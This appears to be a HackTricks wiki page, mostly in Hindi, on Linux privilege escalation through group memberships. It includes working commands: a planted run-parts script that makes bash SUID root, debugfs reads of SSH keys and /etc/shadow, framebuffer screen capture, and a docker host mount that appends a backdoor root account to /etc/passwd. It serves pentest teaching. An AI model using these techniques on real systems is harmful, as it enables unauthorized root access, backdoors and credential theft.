# Interesting Groups - Linux Privesc

## Sudo/Admin Groups

### **PE - Method 1**

**कभी-कभी**, किसी system की **/etc/sudoers** policy (या उसमें शामिल की गई file) में इस तरह की entries होती हैं:<sup>[[3]](#references)</sup>
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
इसका अर्थ है कि किसी भी entry से match होने वाला user `sudo` के माध्यम से किसी भी target user के रूप में कोई भी command चला सकता है (नीति के बाकी हिस्से के अधीन)।<sup>[[3]](#references)</sup>

यदि ऐसा है, तो **root बनने के लिए आप बस execute कर सकते हैं**:
```
sudo su
```
### PE - Method 2

सभी suid binaries खोजें और जांचें कि binary **Pkexec** मौजूद है या नहीं:
```bash
find / -perm -4000 2>/dev/null
```
यदि **pkexec एक SUID binary** है, तो यह किसी अन्य user के रूप में program केवल तभी execute कर सकता है जब polkit अनुरोधित action को authorize करे; केवल SUID bit root की गारंटी नहीं देता। इंस्टॉल की गई policy और target session के authorization की जाँच करें, यह मानने के बजाय कि **sudo** या **admin** की membership पर्याप्त है।<sup>[[4]](#references)[[5]](#references)</sup>

उन distributions पर जो अभी भी पुराने Local Authority backend का उपयोग करते हैं, इसकी group rules को इस प्रकार inspect करें:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
प्रासंगिक group names और defaults distribution के अनुसार अलग-अलग होते हैं; यहाँ कोई group तभी उपयोगी है जब local policy उसका नाम बताए।<sup>[[5]](#references)</sup>

**root बनने के लिए आप execute कर सकते हैं**:
```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```
यदि आप **pkexec** execute करने का प्रयास करते हैं और आपको यह **error** मिलता है:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
पंजीकृत authentication agent के बिना SSH session में, `pkexec` इस error के साथ fail हो सकता है, भले ही policy अन्यथा action की अनुमति देती हो; polkit, non-desktop sessions के लिए `pkttyagent` को text authentication agent के रूप में document करता है। सटीक behavior version और distribution पर निर्भर करता है, इसलिए local policy और agent setup को verify करें। प्रभावित NixOS versions के लिए रिपोर्ट किया गया एक workaround **2 अलग-अलग SSH sessions** का उपयोग करता है।<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Group

कभी-कभी sudoers policy में यह entry भी हो सकती है:
```
%wheel	ALL=(ALL:ALL) ALL
```
इसका अर्थ है कि entry से match होने वाला कोई भी user `sudo` के माध्यम से किसी भी target user के रूप में कोई भी command चला सकता है (बाकी policy के अधीन)।<sup>[[3]](#references)</sup>

यदि ऐसा है, तो **root बनने के लिए आप बस इसे execute कर सकते हैं**:
```
sudo su
```
## Shadow Group

जिन systems पर permissions इसकी अनुमति देती हैं, **shadow** group के users **/etc/shadow** को **read** कर सकते हैं; target पर वास्तविक mode और ACLs verify करें:<sup>[[6]](#references)[[7]](#references)</sup>
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
तो, फ़ाइल पढ़ें और कुछ hashes को **crack** करने का प्रयास करें।

Hashes की triage करते समय lock-state की एक महत्वपूर्ण बारीकी:
- `!` या `*` वाली entries आम तौर पर password logins के लिए non-interactive होती हैं।
- `!hash` का अर्थ है कि password locked था; बचे हुए characters उस password field को दर्शाते हैं जो lock किए जाने से पहले था।
- `*` वाला field मान्य `crypt(3)` hash नहीं है और UNIX-password login को रोकता है; इससे यह निष्कर्ष न निकालें कि पहले कोई password set था या नहीं।

यह account classification के लिए उपयोगी है, भले ही direct login blocked हो।<sup>[[6]](#references)</sup>

## Staff Group

**staff**: Users को root privileges की आवश्यकता के बिना system (`/usr/local`) में local modifications जोड़ने की अनुमति देता है (ध्यान दें कि `/usr/local/bin` में executables किसी भी user के `PATH` variable में होते हैं, और वे समान नाम वाले `/bin` तथा `/usr/bin` के executables को "override" कर सकते हैं)। इसकी तुलना "adm" group से करें, जो monitoring/security से अधिक संबंधित है।<sup>[[2]](#references)[[7]](#references)</sup>

ऐसी Debian configurations में जहाँ `PATH` में `/usr/local/bin`, `/usr/bin` से पहले आता है (जैसा कि नीचे दिए गए examples में), कोई unqualified command पहले `/usr/local/bin` वाली copy पर resolve होती है; target पर effective `PATH` की पुष्टि करें।
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
यदि कोई privileged process writable `/usr/local/bin` के माध्यम से unqualified command को resolve करता है, तो उस command को replace करने पर वह process के privileges के साथ execute हो सकता है; testing से पहले वास्तविक path और trigger की पुष्टि करें।

Ubuntu systems पर, `pam_motd` login के समय root के रूप में `run-parts --lsbsysinit` के माध्यम से executable scripts चलाता है; cron jobs भी `run-parts` का उपयोग कर सकती हैं, लेकिन यह distribution और configuration पर निर्भर करता है।<sup>[[10]](#references)[[11]](#references)</sup>
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
नए SSH login पर, `pspy` यह पुष्टि करने में मदद कर सकता है कि target पर यह path वास्तव में invoke होता है या नहीं; यह root के बिना process command lines को observe कर सकता है।<sup>[[10]](#references)[[12]](#references)</sup>
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

**disk** group की membership block devices तक raw access प्रदान कर सकती है और अक्सर **root access के करीब** होती है; Debian इसे अधिकांशतः root के equivalent बताता है, लेकिन target पर वास्तविक device permissions और storage layout को verify करें।<sup>[[7]](#references)</sup>

Common device paths में `/dev/sd*` शामिल हैं, लेकिन NVMe और अन्य storage layouts अलग-अलग names का उपयोग करते हैं।
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
`debugfs` ext2/ext3/ext4 filesystems पर काम करता है; ऊपर दिए गए `/root` और `/etc/shadow` जैसे paths खोले गए filesystem के अंदर की files हैं, जबकि `dump` का दूसरा argument native filesystem पर एक output path है।<sup>[[8]](#references)</sup> उदाहरण के लिए, यह खोले गए filesystem से `/tmp/asd1.txt` को native filesystem पर `/tmp/asd2.txt` में extract करता है:
```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
`-w` विकल्प filesystem को read-write मोड में खोलता है, और `write` command एक native file को खुले हुए filesystem में कॉपी करता है। इसे mounted live filesystem पर इस्तेमाल करने से बचें, क्योंकि direct edits filesystem को corrupt कर सकते हैं; संभव हो तो offline image पर काम करें।<sup>[[8]](#references)</sup>
```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```
## Video Group

`w` command का उपयोग करके आप पता लगा सकते हैं कि **system पर कौन logged on है**, और यह निम्नलिखित जैसा output दिखाएगा।<sup>[[20]](#references)</sup>
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** entry पहले Linux virtual console की पहचान करती है; यह अपने आप में यह प्रमाणित नहीं करती कि कोई user मशीन पर physically मौजूद है, विशेष रूप से containers या अन्य environments में।<sup>[[21]](#references)</sup>

जिन systems में readable framebuffer device उपलब्ध होता है, वहाँ **video** group की membership उस device तक access प्रदान कर सकती है। Linux framebuffer interface `/dev/fb0` को एक readable memory device के रूप में document करता है, जिसे screen snapshot के लिए copy किया जा सकता है; `/sys/class/graphics/fb0/virtual_size` path केवल वहीं उपलब्ध होता है जहाँ वह fbdev sysfs attribute मौजूद हो, इसलिए पहले target की जाँच करें।<sup>[[7]](#references)[[9]](#references)</sup>
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
यदि installed **GIMP** version raw-data importer उपलब्ध कराता है, तो उस importer से **`screen.raw`** खोलें; support और controls version तथा plug-in के अनुसार अलग-अलग हो सकते हैं।<sup>[[22]](#references)</sup>

![Disk Group - Video Group: Raw image खोलने के लिए आप GIMP का उपयोग कर सकते हैं, screen.raw फ़ाइल चुनें और file type के रूप में Raw image data चुनें](<../../../images/image (463).png>)

Image Width और Height को framebuffer geometry के अनुरूप सेट करें; जब तक output पढ़ने योग्य न हो जाए, उपलब्ध pixel formats/Image Types आज़माएँ।<sup>[[9]](#references)</sup>

![Disk Group - Video Group: फिर Width और Height को screen पर उपयोग किए गए मानों के अनुसार बदलें और अलग-अलग Image Types जाँचें (और वह चुनें जो screen को बेहतर दिखाए)](<../../../images/image (317).png>)

## Root Group

**root** group की membership root का UID प्रदान नहीं करती, लेकिन `root` के स्वामित्व वाली group-writable files तब भी उपयोगी हो सकती हैं जब privileged services या libraries उनका उपयोग करती हों। किसी file को privilege-escalation path मानने से पहले उसकी वास्तविक permissions और उसके उपयोग का सत्यापन करें।

**जाँचें कि root members किन files को modify कर सकते हैं**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

`docker` group की membership standard rootful installs पर Docker daemon को root-level access प्रदान करती है। क्योंकि bind mounts डिफ़ॉल्ट रूप से read-write होते हैं, इसलिए उस daemon को control करने वाला user host के `/` को किसी container में mount कर सकता है और host files को बदल सकता है; इससे प्रभावी रूप से host पर root access मिल जाता है।<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```
अंततः, यदि आपको पहले दिए गए कोई भी सुझाव पसंद नहीं आते, या वे किसी कारणवश काम नहीं कर रहे हैं (docker api firewall?), तो आप हमेशा **एक privileged container चलाने और उससे escape करने** का प्रयास कर सकते हैं, जैसा कि यहां समझाया गया है:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

यदि आपके पास docker socket पर write permissions हैं, तो [**docker socket का दुरुपयोग करके privileges escalate करने के तरीके के बारे में यह post पढ़ें**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd समूह

{{#ref}}
./
{{#endref}}

## Adm समूह

आमतौर पर **`adm`** समूह के **members** के पास _/var/log/_ के अंदर स्थित **log** files को **read** करने की permissions होती हैं।\
इसलिए, यदि आपने इस समूह के किसी user को compromise किया है, तो आपको निश्चित रूप से **logs पर नज़र डालनी चाहिए**।<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail समूह

इन समूहों के अर्थ service- और distribution-specific होते हैं। Debian delegated backup/restore के लिए `backup`, printer daemons के लिए `lp`, और `/var/mail` के लिए `mail` document करता है, इसलिए membership को privilege path मानने से पहले local permissions की जांच करें।<sup>[[7]](#references)</sup>

ये अक्सर direct root vectors के बजाय **credential-discovery** vectors होते हैं:
- **backup**: configs, keys, DB dumps या tokens वाले archives expose कर सकता है।
- **operator**: platform-specific operational access, जो sensitive runtime data को leak कर सकता है।
- **lp**: print queues/spools में documents की contents हो सकती हैं।
- **mail**: mail spools reset links, OTPs और internal credentials expose कर सकते हैं।

यहां membership को high-value data exposure finding मानें और password/token reuse के माध्यम से pivot करें।

## Auth समूह

OpenBSD पर, जब S/Key configured होता है, `/etc/skey` का ownership `root:auth` होता है और इसके records तक access के लिए `auth` समूह आवश्यक होता है; YubiKey records `/var/db/yubikey` में stored होते हैं।<sup>[[16]](#references)[[17]](#references)</sup> S/Key या YubiKey enabled वाली vulnerable OpenBSD 6.6 configuration ने `auth` privileges वाले local users को root बनने की अनुमति दी; Qualys prerequisite और exploit chain को document करता है, और linked PoC इसे implement करता है।<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [GUI session के बिना pkexec/pkttyagent authentication (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linux manual page](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Debian को सुरक्षित करने का Manual](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linux manual page](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [The Frame Buffer Device — The Linux Kernel documentation](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — unprivileged Linux process snooping](https://github.com/DominicBreuker/pspy)
- [13] [Docker Engine security](https://docs.docker.com/engine/security/)
- [14] [Manage Docker as a non-root user](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Running containers — Docker Docs](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSD manual pages](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSD manual pages](https://man.openbsd.org/login_yubikey.8)
- [18] [OpenBSD में Authentication vulnerabilities — Qualys Security Advisory](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — local exploit PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linux manual page](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Linux allocated devices (4.x+ version)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Image Import and Export — GIMP Documentation](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
